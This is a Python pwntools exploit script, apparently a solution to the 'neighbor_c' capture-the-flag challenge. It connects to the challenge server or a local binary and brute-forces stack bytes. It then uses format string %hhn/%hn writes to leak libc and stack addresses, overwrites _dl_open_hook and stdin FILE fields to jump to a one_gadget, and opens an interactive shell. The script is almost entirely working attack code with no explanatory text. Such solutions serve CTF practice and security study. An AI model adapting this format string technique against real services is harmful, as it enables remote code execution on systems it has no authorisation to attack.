#!/usr/bin/env python
from pwn import *
import random

# brute force 8 bits

def fsb(payload):
    s.sendline(payload)
    time.sleep(1)

def change_target(target):
    global prev_target
    for i, t in enumerate(p64(target)):
        if t != p64(prev_target)[i]:
            payload = ''
            payload += '%{}x'.format((stack_addr & 0xff) + 0xd0 + i)
            payload += '%7$hhn'
            fsb(payload)
            payload = ''
            payload += '%{}x'.format(ord(t) + 0x100)
            payload += '%11$hhn'
            fsb(payload)
    prev_target = target

def overwrite(target, data):
    log.info('Overwriting to %#x...' % target)
    for i, d in enumerate(data):
        change_target(target + i)
        payload = ''
        payload += '%{}x'.format(ord(d) + 0x100)
        payload += '%5$hhn'
        fsb(payload)

if __name__ == '__main__':
    libc = ELF('./libc.so.6')

    count = 0
    while True:
        log.info('Count: %#x' % count)
        count += 1
        if len(sys.argv) == 1:
            s = process('./neighbor_c', stderr = open('/dev/null', 'w'), env = {'LD_PRELOAD': './libc.so.6'})
        else:
            s = remote('neighbor.chal.ctf.westerns.tokyo', 37565)

        s.recvuntil('mayor.\n')

        try:
            # stderr -> stdout
            fsb('%{}x'.format((random.randint(3, 15) << 4) + 8) + '%7$hhn')
            fsb('%{}x'.format((random.randint(0, 15) << 0xc) + 0x600) + '%11$hn')

            fsb('A')
            res = s.recvline(timeout = 1)
            if res == '':
                s.close()
                continue
        except EOFError:
            s.close()
            continue

        fsb('%5$p')
        prev_target = int(s.recvline(False), 16)
        libc_base = prev_target - 0x3c2520
        log.info('libc base: %#x' % libc_base)
        fsb('%7$p')
        stack_addr = int(s.recvline(False), 16)
        log.info('stack address: %#x' % stack_addr)
        if stack_addr & 0xff < 0x30:
            print 'try again.'
            exit(0)

        one_gadgets = [0x45526, 0x4557a, 0xf1651, 0xf24cb]

        overwrite(libc_base + libc.symbols['_dl_open_hook'], 'A')
        overwrite(libc_base + 0x3c1028, p64(libc_base + one_gadgets[3]))
        log.info('Overwriting to %#x...' % (libc_base + libc.symbols['_IO_2_1_stdin_'] + 0xd8))
        change_target(libc_base + libc.symbols['_IO_2_1_stdin_'] + 0xd8)
        payload = ''
        payload += '%{}x'.format((libc_base + 0x3c1000) & 0xffff)
        payload += '%5$hn'
        fsb(payload)

        s.interactive()
        break
